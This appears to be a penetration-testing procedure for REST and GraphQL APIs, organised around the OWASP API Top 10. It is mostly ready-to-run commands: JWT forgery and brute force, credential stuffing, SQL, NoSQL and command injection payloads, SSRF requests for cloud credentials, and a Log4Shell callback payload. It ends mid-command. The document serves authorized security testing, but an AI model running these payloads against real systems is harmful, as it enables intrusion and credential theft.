# 🛡️ STANDARD OPERATING PROCEDURE (SOP)
# API Security Testing — OWASP API Security Top 10 (2023 Edition)

---

| **Document Information** | |
|---|---|
| **Document Title** | SOP for API Security Vulnerability Assessment & Penetration Testing |
| **Version** | 1.0 |
| **Date** | March 2026 |
| **Classification** | Confidential |
| **Framework Reference** | [OWASP API Security Top 10 — 2023](https://owasp.org/API-Security/editions/2023/en/0x00-notice/) |
| **Scope** | REST APIs & GraphQL APIs |
| **Author** | Security Assessment Team |

---

## 📋 Table of Contents

1. [Purpose & Scope](#1-purpose--scope)
2. [API Testing Methodology Overview](#2-api-testing-methodology-overview)
3. [Tools & Prerequisites](#3-tools--prerequisites)
   - [3.3 Tool Installation Commands](#33-tool-installation-commands)
   - [3.4 Reconnaissance & API Discovery Commands](#34-tool-commands--reconnaissance--api-discovery)
   - [3.5 Authentication & Token Testing Commands](#35-tool-commands--authentication--token-testing)
   - [3.6 Authorization Testing (BOLA/BFLA) Commands](#36-tool-commands--authorization-testing-bolabfla)
   - [3.7 Injection & Input Validation Commands](#37-tool-commands--injection--input-validation)
   - [3.8 Rate Limiting & Resource Consumption Commands](#38-tool-commands--rate-limiting--resource-consumption)
   - [3.9 SSRF Testing Commands](#39-tool-commands--ssrf-testing)
   - [3.10 Security Misconfiguration & Headers Commands](#310-tool-commands--security-misconfiguration--headers)
   - [3.11 Mass Assignment & Property Testing Commands](#311-tool-commands--mass-assignment--property-testing)
   - [3.12 Nuclei Automated Scanning Commands](#312-tool-commands--nuclei-automated-scanning)
4. [REST vs GraphQL — Attack Surface Comparison](#4-rest-vs-graphql--attack-surface-comparison)
5. [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
6. [API2:2023 — Broken Authentication](#api22023--broken-authentication)
7. [API3:2023 — Broken Object Property Level Authorization](#api32023--broken-object-property-level-authorization)
8. [API4:2023 — Unrestricted Resource Consumption](#api42023--unrestricted-resource-consumption)
9. [API5:2023 — Broken Function Level Authorization (BFLA)](#api52023--broken-function-level-authorization-bfla)
10. [API6:2023 — Unrestricted Access to Sensitive Business Flows](#api62023--unrestricted-access-to-sensitive-business-flows)
11. [API7:2023 — Server Side Request Forgery (SSRF)](#api72023--server-side-request-forgery-ssrf)
12. [API8:2023 — Security Misconfiguration](#api82023--security-misconfiguration)
13. [API9:2023 — Improper Inventory Management](#api92023--improper-inventory-management)
14. [API10:2023 — Unsafe Consumption of APIs](#api102023--unsafe-consumption-of-apis)
15. [Reporting Template](#15-reporting-template)
16. [Appendix — Quick Reference Checklists](#16-appendix--quick-reference-checklists)

---

## 1. Purpose & Scope

### 1.1 Purpose
This SOP provides a structured, repeatable procedure for conducting **Vulnerability Assessment and Penetration Testing (VAPT)** on APIs. It is aligned with the **OWASP API Security Top 10 (2023)** framework and provides separate test cases, payloads, and attack scenarios for both **REST APIs** and **GraphQL APIs**.

### 1.2 Scope
This SOP covers security testing of:
- **RESTful APIs** — Using standard HTTP methods (GET, POST, PUT, PATCH, DELETE) with JSON/XML payloads
- **GraphQL APIs** — Using queries, mutations, subscriptions, introspection, and batching
- **Authentication mechanisms** — OAuth 2.0, JWT, API Keys, Basic Auth, Session-based
- **Third-party API integrations** — Webhooks, callbacks, and upstream/downstream API dependencies

### 1.3 Out of Scope
- WebSocket-only APIs (unless exposed via GraphQL subscriptions)
- gRPC/Protobuf APIs (covered in a separate SOP)
- Network-level testing (covered in the Server & Network Devices VAPT SOP)

### 1.4 Audience
- Penetration Testers & Red Team Members
- Application Security Engineers
- DevSecOps Engineers
- QA Security Analysts

---

## 2. API Testing Methodology Overview

> **📌 IMAGE SUGGESTION:** Insert the API testing methodology flowchart here showing the 8-phase approach.

### Phase 1: Reconnaissance & Discovery
- Identify all API endpoints (Swagger/OpenAPI specs, GraphQL introspection)
- Map API attack surface (parameters, headers, authentication flows)
- Discover hidden/undocumented endpoints

### Phase 2: Authentication Testing
- Test authentication mechanisms for weaknesses
- Validate token handling (JWT, OAuth tokens, API keys)
- Test session management

### Phase 3: Authorization Testing
- Test object-level authorization (BOLA)
- Test function-level authorization (BFLA)
- Test property-level authorization

### Phase 4: Input Validation Testing
- Test for injection attacks (SQLi, NoSQLi, Command Injection)
- Test for XSS via API responses
- Test request/response manipulation

### Phase 5: Rate Limiting & Resource Testing
- Test rate limiting effectiveness
- Test resource consumption limits
- Test batch operation limits (especially GraphQL)

### Phase 6: Business Logic Testing
- Test sensitive business flow abuse
- Test workflow bypass scenarios
- Test race conditions

### Phase 7: Configuration Review
- Review CORS policies
- Review TLS/SSL configuration
- Review error handling and information disclosure

### Phase 8: Reporting
- Document all findings with severity ratings
- Provide remediation recommendations
- Include proof-of-concept for each finding

---

## 3. Tools & Prerequisites

### 3.1 Required Tools

| **Category** | **Tool** | **Purpose** |
|---|---|---|
| Proxy/Interceptor | Burp Suite Pro / OWASP ZAP | Intercepting and modifying API requests |
| API Testing | Postman / Insomnia | Manual API testing and collection management |
| GraphQL Testing | GraphQL Voyager, InQL (Burp Extension) | GraphQL schema analysis and testing |
| GraphQL Fuzzing | BatchQL, graphql-cop | GraphQL-specific vulnerability scanning |
| Fuzzing | ffuf, wfuzz | Endpoint discovery and parameter fuzzing |
| Scanning | Nuclei, Nikto | Automated vulnerability scanning |
| JWT Analysis | jwt.io, jwt_tool | JWT token analysis and manipulation |
| Scripting | Python (requests lib), curl | Custom exploit scripts |
| Wordlists | SecLists, FuzzDB | Payloads and wordlists for fuzzing |

### 3.2 Prerequisites
- [ ] Written authorization (scope document / ROE) obtained
- [ ] API documentation reviewed (Swagger/OpenAPI/GraphQL schema)
- [ ] Test accounts with various privilege levels provisioned
- [ ] Test environment identified (staging preferred, production with caution)
- [ ] Communication channels established with development team
- [ ] Incident response plan acknowledged
- [ ] VPN/network access configured if testing internal APIs

### 3.3 Tool Installation Commands

```bash
# ── Core Tools ──────────────────────────────────────────────────
# Burp Suite — Download from https://portswigger.net/burp/releases
# OWASP ZAP — Download from https://www.zaproxy.org/download/

# Postman (CLI / Newman for automation)
npm install -g newman

# ── Fuzzing & Discovery ─────────────────────────────────────────
# ffuf — Fast web fuzzer
go install github.com/ffuf/ffuf/v2@latest
# OR download binary from https://github.com/ffuf/ffuf/releases

# wfuzz — Python-based fuzzer
pip install wfuzz

# Nuclei — Template-based scanner
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# Nikto — Web server scanner
sudo apt install nikto   # Debian/Ubuntu
# OR: git clone https://github.com/sullo/nikto.git

# ── JWT Tools ───────────────────────────────────────────────────
# jwt_tool — JWT manipulation & testing
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip install -r requirements.txt

# ── GraphQL-Specific Tools ──────────────────────────────────────
# InQL — Burp Suite Extension for GraphQL
# Install via Burp → Extender → BApp Store → Search "InQL"

# graphql-cop — GraphQL API security auditor
pip install graphql-cop

# BatchQL — GraphQL batching attack tool
git clone https://github.com/assetnote/batchql.git
cd batchql && pip install -r requirements.txt

# CrackQL — GraphQL password brute-forcer
git clone https://github.com/nicholasaleks/CrackQL.git
cd CrackQL && pip install -r requirements.txt

# GraphQL Voyager — Schema visualization (browser-based)
# https://graphql-kit.com/graphql-voyager/

# graphw00f — GraphQL server fingerprinting
git clone https://github.com/dolevf/graphw00f.git

# ── Injection & Exploitation ───────────────────────────────────
# sqlmap — Automated SQL injection
pip install sqlmap
# OR: git clone https://github.com/sqlmapproject/sqlmap.git

# ── SSL/TLS Testing ────────────────────────────────────────────
# testssl.sh — TLS/SSL cipher & vulnerability scanner
git clone https://github.com/drwetter/testssl.sh.git

# sslyze — Fast SSL/TLS scanner
pip install sslyze

# ── Wordlists ──────────────────────────────────────────────────
# SecLists — Collection of wordlists
git clone https://github.com/danielmiessler/SecLists.git

# FuzzDB — Attack patterns & discovery lists
git clone https://github.com/fuzzdb-project/fuzzdb.git
```

---

### 3.4 Tool Commands — Reconnaissance & API Discovery

#### 🔹 REST API Discovery

```bash
# ── Swagger/OpenAPI Spec Discovery ──────────────────────────────
# Check common paths for API documentation
curl -sk https://TARGET/swagger.json
curl -sk https://TARGET/openapi.json
curl -sk https://TARGET/api-docs
curl -sk https://TARGET/v1/swagger.json
curl -sk https://TARGET/v2/api-docs
curl -sk https://TARGET/.well-known/openapi.json

# Fuzz for Swagger/OpenAPI endpoints with ffuf
ffuf -u https://TARGET/FUZZ -w SecLists/Discovery/Web-Content/swagger.txt -mc 200

# ── Endpoint Discovery with ffuf ────────────────────────────────
# Discover REST API endpoints
ffuf -u https://TARGET/api/v1/FUZZ -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,301,302,401,403,405 -H "Authorization: Bearer TOKEN"

# Discover API versions
ffuf -u https://TARGET/api/vFUZZ/users -w <(seq 1 10) -mc 200,301,401,403

# Discover hidden parameters
ffuf -u "https://TARGET/api/users?FUZZ=test" \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs BASELINE_SIZE

# ── Endpoint Discovery with wfuzz ───────────────────────────────
wfuzz -c -z file,SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  --hc 404 -H "Authorization: Bearer TOKEN" https://TARGET/api/v1/FUZZ

# ── HTTP Method Testing ─────────────────────────────────────────
# Test which HTTP methods are allowed on an endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do \
  echo -n "$method: "; \
  curl -sk -o /dev/null -w "%{http_code}" -X $method https://TARGET/api/v1/users; \
  echo; \
done

# Nmap for API service discovery
nmap -sV -p 80,443,8080,8443,3000,5000,8000 TARGET --script=http-headers,http-title
```

#### 🔹 GraphQL API Discovery

```bash
# ── GraphQL Endpoint Discovery ──────────────────────────────────
# Check common GraphQL endpoint paths
for path in graphql gql graphiql playground altair query api/graphql v1/graphql; do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" https://TARGET/$path); \
  echo "$path → $CODE"; \
done

# ── GraphQL Introspection Query ─────────────────────────────────
# Full schema dump via introspection
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' \
  | python -m json.tool

# Introspection — List all queries and mutations
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } mutationType { fields { name description args { name type { name } } } } } }"}' \
  | python -m json.tool

# ── GraphQL Server Fingerprinting ───────────────────────────────
python3 graphw00f/main.py -t https://TARGET/graphql

# ── graphql-cop — Automated GraphQL Security Audit ──────────────
graphql-cop -t https://TARGET/graphql

# ── InQL Scanner (CLI mode) ─────────────────────────────────────
# Generate queries from introspection
inql -t https://TARGET/graphql -o ./graphql_output/
```

---

### 3.5 Tool Commands — Authentication & Token Testing

```bash
# ══════════════════════════════════════════════════════════════════
# JWT TOKEN ANALYSIS & ATTACKS
# ══════════════════════════════════════════════════════════════════

# ── Decode JWT token (manual) ───────────────────────────────────
echo "JWT_TOKEN_HERE" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo
echo "JWT_TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo

# ── jwt_tool — Full JWT analysis ────────────────────────────────
# Analyze a JWT token (decode + vulnerability checks)
python3 jwt_tool.py JWT_TOKEN_HERE

# Test alg:none attack
python3 jwt_tool.py JWT_TOKEN_HERE -X a

# Test null signature attack
python3 jwt_tool.py JWT_TOKEN_HERE -X n

# Key confusion attack (RS256 → HS256) using public key
python3 jwt_tool.py JWT_TOKEN_HERE -X k -pk public_key.pem

# Brute force JWT secret key
python3 jwt_tool.py JWT_TOKEN_HERE -C -d SecLists/Passwords/jwt-secrets.txt

# Tamper JWT claims (change user role)
python3 jwt_tool.py JWT_TOKEN_HERE -T -S hs256 -p "secret" \
  -pc "role" -pv "admin"

# Inject into JWT header (kid injection)
python3 jwt_tool.py JWT_TOKEN_HERE -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# ══════════════════════════════════════════════════════════════════
# BRUTE FORCE & CREDENTIAL TESTING
# ══════════════════════════════════════════════════════════════════

# ── ffuf — Login brute force ────────────────────────────────────
# Brute force with username:password list
ffuf -u https://TARGET/api/auth/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -mc 200 -fr "invalid"

# Credential stuffing with user:pass combos
ffuf -u https://TARGET/api/auth/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"UFUZZ","password":"PFUZZ"}' \
  -w usernames.txt:UFUZZ -w passwords.txt:PFUZZ -mode pitchfork \
  -mc 200

# ── Hydra — HTTP POST brute force ──────────────────────────────
hydra -l admin -P SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  TARGET http-post-form \
  "/api/auth/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:invalid credentials" \
  -t 10

# ── curl — Test password reset flow ─────────────────────────────
# Trigger password reset
curl -sk -X POST https://TARGET/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Test if reset token is predictable (repeat and compare tokens)
for i in $(seq 1 5); do \
  curl -sk -X POST https://TARGET/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'; echo; \
done

# ── GraphQL Brute Force with CrackQL ───────────────────────────
# Create a GraphQL query template file (mutation_login.graphql):
# mutation { login(username: "victim", password: {{password}}) { token } }
python3 CrackQL.py -t https://TARGET/graphql \
  -q mutation_login.graphql \
  -i passwords.txt

# ── GraphQL Batching Brute Force (curl) ─────────────────────────
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"victim\",password:\"password1\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"password2\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"password3\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"admin123\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"qwerty\"){token}}"}
  ]'
```

---

### 3.6 Tool Commands — Authorization Testing (BOLA/BFLA)

```bash
# ══════════════════════════════════════════════════════════════════
# IDOR / BOLA TESTING
# ══════════════════════════════════════════════════════════════════

# ── curl — Basic IDOR test ──────────────────────────────────────
# Access another user's object with your token
curl -sk https://TARGET/api/v1/users/VICTIM_ID/profile \
  -H "Authorization: Bearer YOUR_TOKEN"

# Iterate sequential IDs to find accessible objects
for id in $(seq 1 100); do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    https://TARGET/api/v1/users/$id/profile \
    -H "Authorization: Bearer YOUR_TOKEN"); \
  echo "ID=$id → $CODE"; \
done

# ── ffuf — IDOR enumeration ─────────────────────────────────────
# Enumerate object IDs
ffuf -u https://TARGET/api/v1/orders/FUZZ \
  -w <(seq 1000 2000) \
  -H "Authorization: Bearer LOW_PRIV_TOKEN" \
  -mc 200 -o idor_results.json

# ── Autorize (Burp Extension) ──────────────────────────────────
# Install via: Burp → Extender → BApp Store → "Autorize"
# 1. Set low-privilege token in Autorize config
# 2. Browse as admin while Autorize auto-replays with low-priv token
# 3. Review results for authorization bypasses (RED = bypass found)

# ══════════════════════════════════════════════════════════════════
# BFLA — FUNCTION LEVEL AUTHORIZATION TESTING
# ══════════════════════════════════════════════════════════════════

# ── Test admin endpoints with regular user token ────────────────
ADMIN_PATHS="admin/users admin/config admin/dashboard admin/export admin/logs \
  internal/metrics internal/debug users/export_all system/health"

for path in $ADMIN_PATHS; do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    https://TARGET/api/v1/$path \
    -H "Authorization: Bearer REGULAR_USER_TOKEN"); \
  echo "/api/v1/$path → $CODE"; \
done

# ── ffuf — Admin endpoint fuzzing ───────────────────────────────
ffuf -u https://TARGET/api/FUZZ \
  -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -mc 200,201 -o bfla_results.json

# ── HTTP Method Tampering ───────────────────────────────────────
# Test if changing HTTP method bypasses authorization
curl -sk -X DELETE https://TARGET/api/v1/users/VICTIM_ID \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"

curl -sk -X PUT https://TARGET/api/v1/users/VICTIM_ID \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# ── GraphQL — Test admin operations ─────────────────────────────
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"query":"mutation { deleteAllUsers(confirm: true) { count } }"}'

curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"query":"{ adminDashboard { totalRevenue activeUsers } }"}'
```

---

### 3.7 Tool Commands — Injection & Input Validation

```bash
# ══════════════════════════════════════════════════════════════════
# SQL INJECTION TESTING
# ══════════════════════════════════════════════════════════════════

# ── sqlmap — Automated SQLi on REST API ─────────────────────────
# Test URL parameter
sqlmap -u "https://TARGET/api/v1/users?id=1" \
  --headers="Authorization: Bearer TOKEN" --batch --level=3 --risk=2

# Test POST body parameters
sqlmap -u "https://TARGET/api/v1/search" \
  --data='{"query":"test","category":"all"}' \
  --headers="Authorization: Bearer TOKEN\nContent-Type: application/json" \
  --batch --level=3 --risk=2

# Test specific parameter in JSON body
sqlmap -u "https://TARGET/api/v1/search" \
  --data='{"query":"test","category":"all"}' \
  -p "query" --headers="Authorization: Bearer TOKEN\nContent-Type: application/json" \
  --batch --dbs

# Save request from Burp and test
sqlmap -r burp_request.txt --batch --level=5 --risk=3

# ── Manual SQLi payloads via curl ───────────────────────────────
# Error-based SQLi test
curl -sk "https://TARGET/api/v1/users?id=1'" \
  -H "Authorization: Bearer TOKEN"

# Union-based SQLi test
curl -sk "https://TARGET/api/v1/users?id=1 UNION SELECT null,null,null--" \
  -H "Authorization: Bearer TOKEN"

# Boolean-based blind SQLi
curl -sk "https://TARGET/api/v1/users?id=1 AND 1=1" \
  -H "Authorization: Bearer TOKEN"

# Time-based blind SQLi
curl -sk "https://TARGET/api/v1/users?id=1; WAITFOR DELAY '0:0:5'--" \
  -H "Authorization: Bearer TOKEN"

# ══════════════════════════════════════════════════════════════════
# NoSQL INJECTION TESTING
# ══════════════════════════════════════════════════════════════════

# MongoDB injection via JSON body
curl -sk -X POST https://TARGET/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# MongoDB $regex injection
curl -sk -X POST https://TARGET/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# ══════════════════════════════════════════════════════════════════
# COMMAND INJECTION TESTING
# ══════════════════════════════════════════════════════════════════

# Test OS command injection in API parameters
curl -sk "https://TARGET/api/v1/tools/ping?host=127.0.0.1;id" \
  -H "Authorization: Bearer TOKEN"

curl -sk "https://TARGET/api/v1/tools/ping?host=127.0.0.1|whoami" \
  -H "Authorization: Bearer TOKEN"

curl -sk -X POST https://TARGET/api/v1/tools/lookup \
  -H "Content-Type: application/json" -H "Authorization: Bearer TOKEN" \
  -d '{"hostname":"example.com\nid"}'

# ══════════════════════════════════════════════════════════════════
# GraphQL INJECTION TESTING
# ══════════════════════════════════════════════════════════════════

# SQLi via GraphQL variable
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(name: \"admin'\'' OR 1=1--\") { id email } }"}'

# NoSQLi via GraphQL variable
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { login(username: \"admin\", password: \"{\\\"$gt\\\": \\\"\\\"}\") { token } }"}'
```

---

### 3.8 Tool Commands — Rate Limiting & Resource Consumption

```bash
# ══════════════════════════════════════════════════════════════════
# RATE LIMITING TESTING
# ══════════════════════════════════════════════════════════════════

# ── curl — Basic rate limit test ────────────────────────────────
# Send 100 requests rapidly and check for 429 responses
for i in $(seq 1 100); do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    https://TARGET/api/v1/users/me \
    -H "Authorization: Bearer TOKEN"); \
  echo "Request $i → $CODE"; \
  [ "$CODE" = "429" ] && echo "RATE LIMITED at request $i" && break; \
done

# ── ffuf — High-speed rate limit test ───────────────────────────
ffuf -u https://TARGET/api/v1/endpoint \
  -w <(for i in $(seq 1 500); do echo $i; done) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,429 -rate 50 -t 20

# ── Turbo Intruder (Burp Extension) ────────────────────────────
# Install via: Burp → Extender → BApp Store → "Turbo Intruder"
# Right-click request → Extensions → Turbo Intruder → Send to Turbo Intruder
# Use race condition template for concurrent request testing

# ── Python — Race Condition Testing ─────────────────────────────
python3 -c "
import asyncio, aiohttp

async def race_request(session, url, headers, data, i):
    async with session.post(url, headers=headers, json=data) as r:
        print(f'Request {i}: {r.status} - {await r.text()[:100]}')

async def main():
    url = 'https://TARGET/api/v1/apply-coupon'
    headers = {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'}
    data = {'coupon_code': 'DISCOUNT50'}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data, i) for i in range(50)]
        await asyncio.gather(*tasks)

asyncio.run(main())
"

# ══════════════════════════════════════════════════════════════════
# GraphQL RESOURCE EXHAUSTION TESTING
# ══════════════════════════════════════════════════════════════════

# ── Test query depth limits ─────────────────────────────────────
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } }"}'

# ── Test batch query limits ─────────────────────────────────────
# Generate a batch of 100 queries
python3 -c "
import json
queries = [{'query': '{users{id name email}}'} for _ in range(100)]
print(json.dumps(queries))
" | curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" -d @-

# ── Test alias-based resource exhaustion ────────────────────────
python3 -c "
aliases = ' '.join([f'a{i}: users {{ id name email }}' for i in range(200)])
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" -d @-

# ── BatchQL — Automated batch testing ──────────────────────────
python3 batchql.py -e https://TARGET/graphql -q '{ users { id } }'
```

---

### 3.9 Tool Commands — SSRF Testing

```bash
# ══════════════════════════════════════════════════════════════════
# SSRF PAYLOAD TESTING
# ══════════════════════════════════════════════════════════════════

# ── Cloud Metadata Endpoints ────────────────────────────────────
# AWS
curl -sk -X POST https://TARGET/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# GCP
curl -sk -X POST https://TARGET/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'

# Azure
curl -sk -X POST https://TARGET/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'

# ── Internal Port Scanning via SSRF ─────────────────────────────
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do \
  START=$(date +%s%N); \
  curl -sk -o /dev/null -X POST https://TARGET/api/fetch-url \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:$port\"}"; \
  END=$(date +%s%N); \
  DIFF=$(( ($END - $START) / 1000000 )); \
  echo "Port $port → ${DIFF}ms"; \
done

# ── SSRF Bypass Techniques ──────────────────────────────────────
PAYLOADS=(
  "http://127.0.0.1"
  "http://0x7f000001"
  "http://2130706433"
  "http://[::1]"
  "http://[::ffff:127.0.0.1]"
  "http://127.1"
  "http://0177.0.0.1"
  "http://127.0.0.1.nip.io"
  "http://localtest.me"
  "http://spoofed.burpcollaborator.net"
)

for payload in "${PAYLOADS[@]}"; do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    https://TARGET/api/fetch-url \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"$payload\"}"); \
  echo "$payload → $CODE"; \
done

# ── Out-of-Band SSRF Detection (Burp Collaborator / interactsh) ─
# interactsh — Free OOB interaction server
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Use generated URL as SSRF payload, monitor for callbacks
```

---

### 3.10 Tool Commands — Security Misconfiguration & Headers

```bash
# ══════════════════════════════════════════════════════════════════
# TLS/SSL TESTING
# ══════════════════════════════════════════════════════════════════

# ── testssl.sh — Comprehensive TLS analysis ─────────────────────
./testssl.sh https://TARGET/api

# Quick check: ciphers, protocols, vulnerabilities
./testssl.sh --protocols --ciphers --vulnerable https://TARGET

# ── sslyze — Fast SSL scanner ──────────────────────────────────
sslyze TARGET:443 --regular

# ── Nmap SSL scripts ───────────────────────────────────────────
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 TARGET

# ══════════════════════════════════════════════════════════════════
# CORS MISCONFIGURATION TESTING
# ══════════════════════════════════════════════════════════════════

# Test with arbitrary origin
curl -sk -I https://TARGET/api/v1/users -H "Origin: https://evil.com" | \
  grep -i "access-control"

# Test with null origin
curl -sk -I https://TARGET/api/v1/users -H "Origin: null" | \
  grep -i "access-control"

# Test with subdomain wildcard bypass
curl -sk -I https://TARGET/api/v1/users \
  -H "Origin: https://evil.TARGET.com" | grep -i "access-control"

# Automated CORS check across multiple endpoints
ENDPOINTS="/api/v1/users /api/v1/orders /api/v1/profile /api/v1/settings"
for ep in $ENDPOINTS; do \
  CORS=$(curl -sk -I https://TARGET$ep -H "Origin: https://evil.com" | \
    grep -i "access-control-allow-origin" | tr -d '\r'); \
  echo "$ep → $CORS"; \
done

# ══════════════════════════════════════════════════════════════════
# SECURITY HEADERS CHECK
# ══════════════════════════════════════════════════════════════════

# Check all security headers in one shot
curl -sk -I https://TARGET/api/v1/endpoint | grep -iE \
  "strict-transport|x-content-type|x-frame|content-security|x-xss|cache-control|referrer-policy|permissions-policy"

# ── Nuclei — Automated misconfiguration scan ───────────────────
nuclei -u https://TARGET -t nuclei-templates/http/misconfiguration/ \
  -t nuclei-templates/http/exposures/ -severity medium,high,critical

# Nuclei — API-specific templates
nuclei -u https://TARGET -tags api,exposure,misconfig -severity medium,high,critical

# ══════════════════════════════════════════════════════════════════
# INFORMATION DISCLOSURE & DEBUG TESTING
# ══════════════════════════════════════════════════════════════════

# Check for verbose error messages
curl -sk "https://TARGET/api/v1/users/999999999999" \
  -H "Authorization: Bearer TOKEN"

# Trigger errors with bad types
curl -sk "https://TARGET/api/v1/users/{{invalid}}" \
  -H "Authorization: Bearer TOKEN"

# Check for debug endpoints
for path in debug trace health info env metrics actuator actuator/env \
  _debug _profiler elmah.axd __diagnostics; do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" https://TARGET/$path); \
  [ "$CODE" != "404" ] && echo "FOUND: /$path → $CODE"; \
done

# ── Log4Shell / JNDI Injection ──────────────────────────────────
# Test via various headers (use interactsh/Burp Collaborator for callback)
JNDI_PAYLOAD='${jndi:ldap://YOUR_CALLBACK_SERVER/test}'
curl -sk https://TARGET/api/v1/health \
  -H "X-Api-Version: $JNDI_PAYLOAD" \
  -H "User-Agent: $JNDI_PAYLOAD" \
  -H "Referer: $JNDI_PAYLOAD" \
  -H "X-Forwarded-For: $JNDI_PAYLOAD"

# ══════════════════════════════════════════════════════════════════
# GraphQL MISCONFIGURATION TESTING
# ══════════════════════════════════════════════════════════════════

# Check if introspection is enabled
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python -m json.tool

# Check for GraphQL IDE exposure
for ide in graphiql playground altair graphql-explorer; do \
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" https://TARGET/$ide); \
  [ "$CODE" != "404" ] && echo "GraphQL IDE FOUND: /$ide → $CODE"; \
done

# Check for field suggestions (information leak)
curl -sk -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userz { name } }"}' | grep -i "suggest"

# graphql-cop — comprehensive GraphQL misconfiguration scan
graphql-cop -t https://TARGET/graphql
```

---

### 3.11 Tool Commands — Mass Assignment & Property Testing

```bash
# ══════════════════════════════════════════════════════════════════
# MASS ASSIGNMENT / PROPERTY LEVEL AUTHORIZATION
# ══════════════════════════════════════════════════════════════════

# ── REST API: Fuzz for writable hidden properties ───────────────
# Baseline response
curl -sk -X PUT https://TARGET/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}' | python -m json.tool > baseline.json

# Test mass assignment with common hidden properties
HIDDEN_PROPS='["role","isAdmin","is_admin","admin","verified","is_verified",
"approved","blocked","is_blocked","active","permissions","group",
"account_type","credit","balance","discount","total_price","price",
"subscription_tier","email_verified","phone_verified","two_factor_enabled"]'

for prop in role isAdmin is_admin admin verified approved blocked \
  active permissions credit balance discount total_price; do \
  RESP=$(curl -sk -X PUT https://TARGET/api/v1/users/me \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"test\",\"$prop\":true}"); \
  echo "Property: $prop → $RESP" | head -c 200; echo; \
done

# ── Arjun — Hidden parameter discovery ─────────────────────────
pip install arjun
arjun -u https://TARGET/api/v1/users -m POST \
  --headers "Authorization: Bearer TOKEN"

# ── Check for excessive data exposure ───────────────────────────
# Compare API response with what the UI shows
curl -sk https://TARGET/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | python -m json.tool

# Check different Accept types for data leakage
curl -sk https://TARGET/api/v1/users/me \
